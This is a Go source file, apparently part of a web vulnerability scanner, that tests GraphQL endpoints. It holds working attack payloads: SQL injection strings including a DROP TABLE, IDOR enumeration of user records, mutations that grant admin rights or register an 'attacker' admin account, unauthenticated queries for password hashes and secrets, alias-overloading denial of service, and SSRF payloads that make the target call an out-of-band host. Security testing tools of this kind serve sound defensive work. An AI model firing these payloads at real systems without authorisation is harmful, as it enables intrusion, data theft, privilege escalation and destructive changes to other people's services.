package main

import (
	"context"
	"encoding/json"
	"fmt"
	"regexp"
	"strings"
	"time"
)

var graphqlPaths = []string{
	"/graphql", "/api/graphql", "/graphql/v1", "/v1/graphql",
	"/graph", "/gql", "/query", "/api/query", "/graphql/console",
	"/graphiql", "/playground", "/api/v1/graphql", "/api/v2/graphql",
	"/graphql/api", "/data", "/api/data",
}

var gqlSQLiPatterns = []*regexp.Regexp{
	regexp.MustCompile(`(?i)(sql syntax|mysql_fetch|pg_query|sqlite_|ORA-\d+|SQLSTATE)`),
	regexp.MustCompile(`(?i)(warning.*mysql|unclosed quotation|unterminated string)`),
	regexp.MustCompile(`(?i)(syntax error.*position|invalid input syntax)`),
}

func (s *Scanner) scanGraphQL(ctx context.Context, target string) {
	// Discover endpoint
	endpoint := s.discoverGQL(ctx, target)
	if endpoint == "" {
		return
	}

	if !s.cfg.Silent {
		logInfo(fmt.Sprintf("[GQL] Endpoint: %s", endpoint))
	}

	baseline := s.requester.Baseline(ctx, endpoint)

	// 1. Introspection (POST)
	s.gqlIntrospection(ctx, endpoint)

	// 2. Introspection via GET
	s.gqlIntrospectionGET(ctx, endpoint)

	// 3. Schema via __type
	s.gqlTypeProbe(ctx, endpoint)

	// 4. Field suggestion (debug mode)
	s.gqlFieldSuggestion(ctx, endpoint)

	// 5. Batch queries
	s.gqlBatchAttack(ctx, endpoint)

	// 6. Alias overloading
	s.gqlAliasOverload(ctx, endpoint)

	// 7. SQLi via args
	s.gqlSQLi(ctx, endpoint, baseline)

	// 8. IDOR user enum
	s.gqlIDOR(ctx, endpoint)

	// 9. Mutation fuzzing
	s.gqlMutations(ctx, endpoint)

	// 10. Auth bypass (no token)
	s.gqlAuthBypass(ctx, endpoint)

	// 11. OOB SSRF
	if s.cfg.OOBHost != "" {
		s.gqlOOB(ctx, endpoint)
	}

	// 12. Persisted query abuse
	s.gqlPersistedQuery(ctx, endpoint)
}

func (s *Scanner) discoverGQL(ctx context.Context, target string) string {
	// If it already looks like a GQL endpoint
	for _, kw := range []string{"graphql", "gql", "graph", "query"} {
		if strings.Contains(strings.ToLower(target), kw) {
			return target
		}
	}

	// Parse base
	base := extractBase(target)

	for _, path := range graphqlPaths {
		testURL := base + path
		resp, err := s.requester.Do(ReqOpts{
			Method:      "POST",
			URL:         testURL,
			ContentType: "application/json",
			Body:        `{"query":"{__typename}"}`,
			Context:     ctx,
		})
		if err != nil {
			continue
		}
		if isGQLResponse(resp.Body) {
			return testURL
		}
		// Try GET
		resp2, err2 := s.requester.Do(ReqOpts{
			Method:  "GET",
			URL:     testURL + "?query={__typename}",
			Context: ctx,
		})
		if err2 == nil && isGQLResponse(resp2.Body) {
			return testURL
		}
	}
	return ""
}

func isGQLResponse(body string) bool {
	return strings.Contains(body, `"data"`) ||
		strings.Contains(body, `"errors"`) ||
		strings.Contains(body, `"__typename"`)
}

func (s *Scanner) gqlIntrospection(ctx context.Context, endpoint string) {
	query := `{"query":"{ __schema { queryType { name } types { name kind fields { name args { name type { name kind } } } } } }"}`
	resp, err := s.requester.Do(ReqOpts{
		Method: "POST", URL: endpoint,
		ContentType: "application/json", Body: query, Context: ctx,
	})
	if err != nil || !strings.Contains(resp.Body, `"__schema"`) {
		return
	}

	// Try to count types
	typeCount := strings.Count(resp.Body, `"name"`)
	s.store.Add(Finding{
		URL:      endpoint,
		Vuln:     "GraphQL",
		Type:     "Introspection Enabled",
		Payload:  `{"query":"{ __schema { types { name } } }"}`,
		Evidence: fmt.Sprintf("Full schema returned (%d fields/types exposed, %d bytes)", typeCount, len(resp.Body)),
		Severity: "MEDIUM",
		Response: truncate(resp.Body, 300),
	})
}

func (s *Scanner) gqlIntrospectionGET(ctx context.Context, endpoint string) {
	resp, err := s.requester.Do(ReqOpts{
		Method:  "GET",
		URL:     endpoint + "?query={__schema{types{name}}}",
		Context: ctx,
	})
	if err != nil || !strings.Contains(resp.Body, `"__schema"`) {
		return
	}
	s.store.Add(Finding{
		URL:      endpoint,
		Vuln:     "GraphQL",
		Type:     "Introspection via GET",
		Payload:  "GET ?query={__schema{types{name}}}",
		Evidence: "Schema exposed via HTTP GET (no POST required)",
		Severity: "MEDIUM",
	})
}

func (s *Scanner) gqlTypeProbe(ctx context.Context, endpoint string) {
	sensitiveTypes := []string{"User", "Admin", "Password", "Secret", "Token", "Key", "Auth", "Session"}
	for _, t := range sensitiveTypes {
		query := fmt.Sprintf(`{"query":"{ __type(name: \"%s\") { name fields { name type { name } } } }"}`, t)
		resp, err := s.requester.Do(ReqOpts{
			Method: "POST", URL: endpoint,
			ContentType: "application/json", Body: query, Context: ctx,
		})
		if err != nil {
			continue
		}
		if strings.Contains(resp.Body, `"name":`) && !strings.Contains(resp.Body, `"null"`) {
			s.store.Add(Finding{
				URL:      endpoint,
				Vuln:     "GraphQL",
				Type:     "Sensitive Type Disclosure",
				Payload:  fmt.Sprintf("__type(name: %q)", t),
				Evidence: fmt.Sprintf("Type '%s' schema returned", t),
				Severity: "LOW",
				Response: truncate(resp.Body, 200),
			})
		}
	}
}

func (s *Scanner) gqlFieldSuggestion(ctx context.Context, endpoint string) {
	resp, err := s.requester.Do(ReqOpts{
		Method: "POST", URL: endpoint,
		ContentType: "application/json",
		Body:        `{"query":"{ nonExistentFieldXYZ123 }"}`,
		Context:     ctx,
	})
	if err != nil {
		return
	}
	if strings.Contains(resp.Body, "Did you mean") ||
		strings.Contains(resp.Body, "suggestion") ||
		strings.Contains(resp.Body, "Similar field") {
		s.store.Add(Finding{
			URL:      endpoint,
			Vuln:     "GraphQL",
			Type:     "Field Suggestion / Debug Mode",
			Payload:  `{ nonExistentFieldXYZ123 }`,
			Evidence: "Server reveals valid field names via error suggestions",
			Severity: "LOW",
			Response: truncate(resp.Body, 300),
		})
	}
}

func (s *Scanner) gqlBatchAttack(ctx context.Context, endpoint string) {
	var batch []map[string]string
	for i := 0; i < 10; i++ {
		batch = append(batch, map[string]string{"query": "{__typename}"})
	}
	data, _ := json.Marshal(batch)
	resp, err := s.requester.Do(ReqOpts{
		Method: "POST", URL: endpoint,
		ContentType: "application/json", Body: string(data), Context: ctx,
	})
	if err != nil {
		return
	}
	if strings.Count(resp.Body, `"__typename"`) > 5 {
		s.store.Add(Finding{
			URL:      endpoint,
			Vuln:     "GraphQL",
			Type:     "Batch Query Attack",
			Payload:  "10x {__typename} batched",
			Evidence: "Server executes batch queries — enables rate-limit bypass and DoS amplification",
			Severity: "MEDIUM",
		})
	}
}

func (s *Scanner) gqlAliasOverload(ctx context.Context, endpoint string) {
	var sb strings.Builder
	sb.WriteString(`{"query":"{ `)
	for i := 0; i < 100; i++ {
		sb.WriteString(fmt.Sprintf("a%d: __typename ", i))
	}
	sb.WriteString(`}"}`)

	start := nowMs()
	s.requester.Do(ReqOpts{
		Method: "POST", URL: endpoint,
		ContentType: "application/json", Body: sb.String(), Context: ctx,
	})
	elapsed := nowMs() - start

	if elapsed > 4000 {
		s.store.Add(Finding{
			URL:      endpoint,
			Vuln:     "GraphQL",
			Type:     "Alias Overloading DoS",
			Payload:  "100x aliased __typename",
			Evidence: fmt.Sprintf("100 aliases caused %dms delay", elapsed),
			Severity: "MEDIUM",
		})
	}
}

func (s *Scanner) gqlSQLi(ctx context.Context, endpoint string, baseline *RespData) {
	sqliInputs := []string{
		`"1 OR 1=1"`, `"1' OR '1'='1"`, `"1; DROP TABLE users--"`,
		`"1 UNION SELECT NULL--"`, `"' OR 1=1--"`,
	}
	queryTemplates := []string{
		`{"query":"{ user(id: %s) { email username } }"}`,
		`{"query":"{ search(term: %s) { results } }"}`,
		`{"query":"{ item(slug: %s) { title } }"}`,
	}

	for _, tpl := range queryTemplates {
		for _, input := range sqliInputs {
			payload := fmt.Sprintf(tpl, input)
			resp, err := s.requester.Do(ReqOpts{
				Method: "POST", URL: endpoint,
				ContentType: "application/json", Body: payload, Context: ctx,
			})
			if err != nil {
				continue
			}
			for _, pat := range gqlSQLiPatterns {
				if s.requester.IsNewContent(baseline, resp, pat) {
					s.store.Add(Finding{
						URL:      endpoint,
						Vuln:     "GraphQL",
						Type:     "SQL Injection via GraphQL",
						Payload:  payload,
						Evidence: fmt.Sprintf("DB error pattern: %s", pat.String()),
						Severity: "CRITICAL",
						Response: extractSnippet(resp.Body, pat),
					})
					return
				}
			}
		}
	}
}

func (s *Scanner) gqlIDOR(ctx context.Context, endpoint string) {
	templates := []string{
		`{"query":"{ user(id: %d) { id email username role isAdmin } }"}`,
		`{"query":"{ account(id: %d) { id email balance } }"}`,
		`{"query":"{ profile(userId: %d) { id name email } }"}`,
	}
	for _, tpl := range templates {
		for id := 1; id <= 5; id++ {
			payload := fmt.Sprintf(tpl, id)
			resp, err := s.requester.Do(ReqOpts{
				Method: "POST", URL: endpoint,
				ContentType: "application/json", Body: payload, Context: ctx,
			})
			if err != nil {
				continue
			}
			if resp.StatusCode < 400 &&
				(strings.Contains(resp.Body, `"email"`) ||
					strings.Contains(resp.Body, `"username"`) ||
					strings.Contains(resp.Body, `"isAdmin"`)) &&
				!strings.Contains(resp.Body, `"null"`) {
				s.store.Add(Finding{
					URL:      endpoint,
					Vuln:     "GraphQL",
					Type:     "IDOR — User/Account Enumeration",
					Payload:  fmt.Sprintf(tpl, id),
					Evidence: fmt.Sprintf("User data returned for id=%d without auth check", id),
					Severity: "HIGH",
					Response: truncate(resp.Body, 200),
				})
				break
			}
		}
	}
}

func (s *Scanner) gqlMutations(ctx context.Context, endpoint string) {
	mutations := []struct {
		name    string
		payload string
	}{
		{"Admin flag", `{"query":"mutation { updateUser(id: 1, input: {isAdmin: true}) { id isAdmin } }"}`},
		{"Mass assign role", `{"query":"mutation { updateProfile(input: {role: \"admin\", isAdmin: true}) { role } }"}`},
		{"Password reset no token", `{"query":"mutation { resetPassword(email: \"admin@example.com\") { success } }"}`},
		{"Register admin", `{"query":"mutation { register(username: \"attacker\", password: \"p@ss\", role: \"admin\") { token } }"}`},
	}

	for _, m := range mutations {
		resp, err := s.requester.Do(ReqOpts{
			Method: "POST", URL: endpoint,
			ContentType: "application/json", Body: m.payload, Context: ctx,
		})
		if err != nil {
			continue
		}
		if !strings.Contains(resp.Body, `"errors"`) && strings.Contains(resp.Body, `"data"`) {
			// No error means it might have worked
			if strings.Contains(resp.Body, "true") || strings.Contains(resp.Body, `"admin"`) {
				s.store.Add(Finding{
					URL:      endpoint,
					Vuln:     "GraphQL",
					Type:     "Mutation — Mass Assignment / Privilege Escalation",
					Payload:  m.payload,
					Evidence: fmt.Sprintf("Mutation '%s' returned data without error", m.name),
					Severity: "CRITICAL",
					Response: truncate(resp.Body, 200),
				})
			}
		}
	}
}

func (s *Scanner) gqlAuthBypass(ctx context.Context, endpoint string) {
	sensitiveQueries := []string{
		`{"query":"{ users { id email role isAdmin } }"}`,
		`{"query":"{ allUsers { id email passwordHash } }"}`,
		`{"query":"{ adminPanel { stats users } }"}`,
		`{"query":"{ secrets { key value } }"}`,
	}

	for _, q := range sensitiveQueries {
		resp, err := s.requester.Do(ReqOpts{
			Method: "POST", URL: endpoint,
			ContentType: "application/json", Body: q, Context: ctx,
		})
		if err != nil {
			continue
		}
		if resp.StatusCode == 200 &&
			strings.Contains(resp.Body, `"data"`) &&
			!strings.Contains(resp.Body, `"errors"`) &&
			!strings.Contains(resp.Body, `null`) {
			s.store.Add(Finding{
				URL:      endpoint,
				Vuln:     "GraphQL",
				Type:     "Auth Bypass — Sensitive Data Without Token",
				Payload:  q,
				Evidence: "Sensitive query returned data without authorization",
				Severity: "HIGH",
				Response: truncate(resp.Body, 300),
			})
		}
	}
}

func (s *Scanner) gqlOOB(ctx context.Context, endpoint string) {
	oobID := randomID("gql")
	payloads := []string{
		fmt.Sprintf(`{"query":"{ importData(url: \"http://%s/oob/%s\") { result } }"}`, s.cfg.OOBHost, oobID),
		fmt.Sprintf(`{"query":"{ webhook(url: \"http://%s/oob/%s\") { status } }"}`, s.cfg.OOBHost, oobID),
		fmt.Sprintf(`{"query":"{ fetch(url: \"http://%s/oob/%s\") { body } }"}`, s.cfg.OOBHost, oobID),
	}
	for _, p := range payloads {
		s.requester.Do(ReqOpts{Method: "POST", URL: endpoint, ContentType: "application/json", Body: p, Context: ctx})
	}
	if hit, info := s.oob.Check(oobID, 5*time.Second); hit {
		s.store.Add(Finding{
			URL:      endpoint,
			Vuln:     "GraphQL",
			Type:     "SSRF via GraphQL OOB",
			Payload:  fmt.Sprintf("URL arg → http://%s/oob/%s", s.cfg.OOBHost, oobID),
			Evidence: fmt.Sprintf("OOB callback received from %s", info.RemoteAddr),
			Severity: "CRITICAL",
		})
	}
}

func (s *Scanner) gqlPersistedQuery(ctx context.Context, endpoint string) {
	// APQ abuse — some endpoints run persisted queries without auth
	payloads := []string{
		`{"extensions":{"persistedQuery":{"version":1,"sha256Hash":"ecf4edb46db40b5132295c0291d62fb65d6759a9eedfa4d5d612dd5ec54a6b38"}}}`,
		`{"id":"1","query":"{__typename}"}`,
	}
	for _, p := range payloads {
		resp, err := s.requester.Do(ReqOpts{
			Method: "POST", URL: endpoint,
			ContentType: "application/json", Body: p, Context: ctx,
		})
		if err != nil {
			continue
		}
		if strings.Contains(resp.Body, `"data"`) && !strings.Contains(resp.Body, "PersistedQueryNotFound") {
			s.store.Add(Finding{
				URL:      endpoint,
				Vuln:     "GraphQL",
				Type:     "Persisted Query Abuse",
				Payload:  p,
				Evidence: "Server executed persisted/cached query by ID",
				Severity: "LOW",
			})
		}
	}
}

func extractBase(rawURL string) string {
	// Extract scheme://host
	for _, prefix := range []string{"https://", "http://"} {
		if strings.HasPrefix(rawURL, prefix) {
			rest := rawURL[len(prefix):]
			slash := strings.Index(rest, "/")
			if slash == -1 {
				return rawURL
			}
			return prefix + rest[:slash]
		}
	}
	return rawURL
}
